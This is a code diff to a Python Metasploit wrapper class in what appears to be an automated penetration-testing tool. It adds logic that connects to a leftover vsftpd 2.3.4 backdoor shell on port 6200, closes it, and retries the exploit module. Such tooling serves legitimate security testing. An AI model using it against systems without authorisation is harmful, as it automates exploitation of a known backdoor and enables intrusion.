@@ -9,6 +9,7 @@ import asyncio
 import logging
 import os
 import re
+import socket
 import tempfile
 import time
 
@@ -733,6 +734,36 @@ class MetasploitTool(BaseTool):
             "error": result.error,
         }
 
+    @staticmethod
+    def _kill_stale_backdoor_port(target_ip: str, port: int = 6200, timeout: float = 3.0) -> bool:
+        """Connect to a stale vsftpd backdoor shell on *port* and close it.
+
+        When the vsftpd_234_backdoor exploit triggers but the payload fails to
+        inject, the backdoor bind-shell stays listening on port 6200.  A
+        subsequent exploit attempt finds it "already in-use" and aborts.
+
+        Fix: connect, optionally send 'exit', and close — this kills the shell
+        process on the target so the port is freed for the next attempt.
+
+        Returns True if the port was open and we connected (cleaned up).
+        Returns False if the port was already closed (no cleanup needed).
+        """
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.settimeout(timeout)
+            s.connect((target_ip, port))
+            try:
+                s.sendall(b"exit\n")
+            except Exception:
+                pass
+            s.close()
+            logger.info(
+                "[MSF] Stale backdoor shell on %s:%d detected and killed.", target_ip, port
+            )
+            return True
+        except (ConnectionRefusedError, OSError):
+            return False  # port already closed — nothing to do
+
     async def _try_native_shell_exploit(
         self,
         module_path: str,
@@ -756,6 +787,17 @@ class MetasploitTool(BaseTool):
         """
         last_output = ""
 
+        # ── Pre-flight: clear any stale backdoor shell on port 6200 ───────────
+        # If a previous run left a bind-shell open on 6200, the module will see
+        # "Already exploited?" and abort.  Connect and send 'exit' to free it.
+        if "vsftpd_234_backdoor" in module_path:
+            cleaned = await asyncio.to_thread(
+                self._kill_stale_backdoor_port, target_ip, 6200
+            )
+            if cleaned:
+                logger.info("[MSF] Cleared stale port 6200 — waiting 2s before exploit")
+                await asyncio.sleep(2)
+
         # ── Pass 1: try bind payloads (preferred — no LHOST, no port conflict) ─
         for candidate in self._INTERACT_CANDIDATES:
             logger.info(
@@ -778,15 +820,43 @@ class MetasploitTool(BaseTool):
 
             # CRITICAL: if the backdoor was spawned but payload failed, port 6200 is now
             # occupied on the target. Any further payload attempt will find port 6200
-            # "already open / not fresh shell" and fail. Stop iterating immediately.
+            # "already open / not fresh shell" and fail.
+            # FIX: kill the stale shell on 6200 and retry the SAME payload once.
             if "Backdoor has been spawned" in output and not _session_opened(output):
                 logger.warning(
                     "[MSF] Backdoor triggered by %s but payload connection failed — "
-                    "port 6200 now occupied on target. Stopping payload iteration to "
-                    "avoid 'Already exploited?' errors on next attempt.",
+                    "killing stale port 6200 and retrying once.",
                     candidate,
                 )
+                cleaned = await asyncio.to_thread(
+                    self._kill_stale_backdoor_port, target_ip, 6200
+                )
+                if cleaned:
+                    await asyncio.sleep(2)
+                    output = await self._run_msfconsole(commands, timeout=timeout)
+                    logger.info("[MSF] Retry output (800 chars):\n%s", output[:800])
+                    if _session_opened(output):
+                        return output
                 return output
+
+            # "Cooldown" = timing issue: backdoor triggered but MSF couldn't connect
+            # in time. Kill stale 6200 shell and retry the same payload.
+            if "Cooldown" in output and "vsftpd_234_backdoor" in module_path:
+                logger.warning(
+                    "[MSF] vsftpd backdoor Cooldown with %s — killing stale 6200 and retrying",
+                    candidate,
+                )
+                cleaned = await asyncio.to_thread(
+                    self._kill_stale_backdoor_port, target_ip, 6200
+                )
+                if cleaned:
+                    await asyncio.sleep(2)
+                output = await self._run_msfconsole(commands, timeout=timeout)
+                logger.info("[MSF] Cooldown retry output (800 chars):\n%s", output[:800])
+                if _session_opened(output):
+                    return output
+                last_output = output
+                continue   # try next candidate if still failed
 
             # NOTE: "The value specified for PAYLOAD is not valid." comes from
             # `set --clear PAYLOAD` and is a FALSE POSITIVE — do NOT match it.
